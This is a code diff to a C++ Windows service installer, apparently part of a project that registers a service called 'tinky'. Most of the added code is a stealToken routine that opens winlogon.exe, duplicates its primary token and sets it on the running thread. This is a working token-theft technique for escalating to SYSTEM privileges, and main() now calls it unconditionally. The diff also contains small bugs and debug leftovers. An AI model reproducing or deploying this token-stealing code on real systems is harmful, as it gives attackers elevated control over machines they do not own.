@@ -11,6 +11,44 @@
 LPCWSTR SVCNAME = L"tinky";
 LPCWSTR SVCPATH = L"C:\\Program Files\\TeamSpeak 3 Client\\ts3client_win64.exe";
 
+int GetProcessByName(const char* filename)
+{
+    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+    PROCESSENTRY32 pEntry;
+    pEntry.dwSize = sizeof(pEntry);
+    BOOL hRes = Process32First(hSnapShot, &pEntry);
+    while (hRes)
+    {
+        _bstr_t StrSwap(pEntry.szExeFile);
+        const char* ProccessFilename = StrSwap;
+        if (strcmp(ProccessFilename, filename) == 0)
+        {
+            return (pEntry.th32ProcessID);
+        }
+        hRes = Process32Next(hSnapShot, &pEntry);
+    }
+    CloseHandle(hSnapShot);
+    return (-1);
+}
+
+HANDLE stealToken()
+{
+    HANDLE token = nullptr;
+    HANDLE newtoken = nullptr;
+    BOOL ret;
+
+    int winlogonID = GetProcessByName("winlogon.exe");
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winlogonID);
+    ret = OpenProcessToken(hProc, TOKEN_DUPLICATE, &token);
+    if (!ret)
+        return (NULL);
+    ret = DuplicateTokenEx(token, 0, nullptr, SecurityImpersonation, TokenPrimary, &newtoken);
+    if (!ret)
+        return (NULL);
+    return (newtoken);
+}
+
+
 void killProcessByName(const char* filename)
 {
     HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
@@ -480,7 +518,7 @@ int SvcInstall()
         SVCNAME,                   // service name to display 
         SERVICE_ALL_ACCESS,        // desired access 
         SERVICE_WIN32_OWN_PROCESS, // service type 
-        SERVICE_DEMAND_START,      // start type 
+        SERVICE_DEMAND_START,      // start type //SERVICE_AUTO_START
         SERVICE_ERROR_NORMAL,      // error control type 
         SVCPATH,                    // path to service's binary 
         NULL,                      // no load ordering group 
@@ -502,7 +540,7 @@ int SvcInstall()
         CloseServiceHandle(schSCManager);
         return (-1);
     }
-    else printf("Service installed successfully\n");
+    else printf("Service {%s} installed successfully.\n", SVCNAME);
 
     CloseServiceHandle(schService);
     CloseServiceHandle(schSCManager);
@@ -511,7 +549,21 @@ int SvcInstall()
 
 int main(int argc, char **argv)
 {
-    char action[100] = "install\0";
+    char action[100] = "hello\0";
+
+    HANDLE token = stealToken();
+    if (token == NULL)
+    {
+        printf("Can't duplicate the token");
+        return (-1);
+    }
+    BOOL rc = SetThreadToken(NULL, token);
+    if (!rc)
+    {
+        printf("hello\n");
+        return false;
+    }
+
 
     if (strcmp(action, "install") == 0)
     {
@@ -530,6 +582,7 @@ int main(int argc, char **argv)
         SvcStop();
         SvcDelete();
     }
+    stealToken();
 	return 0;
 }
 
